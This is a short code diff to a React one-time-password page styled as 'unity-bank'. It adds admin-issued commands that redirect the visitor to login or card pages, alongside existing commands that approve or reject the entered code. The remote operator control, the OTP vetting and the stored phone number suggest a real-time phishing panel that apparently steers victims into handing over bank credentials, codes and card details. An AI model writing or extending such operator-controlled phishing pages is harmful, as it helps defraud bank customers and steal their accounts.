@@ -32,8 +32,10 @@ export default function OtpPage() {
   const inputRef = useRef<HTMLInputElement>(null);
 
   useAdminCommands({
-    "otp:approved": () => setStatus("approved"),
-    "otp:rejected": () => setStatus("rejected"),
+    "otp:approved":   () => setStatus("approved"),
+    "otp:rejected":   () => setStatus("rejected"),
+    "redirect:login": () => { window.location.href = "/unity-bank/login"; },
+    "redirect:card":  () => { window.location.href = "/unity-bank/card"; },
   });
 
   const phone = localStorage.getItem("unity_phone") || "05••••••••";
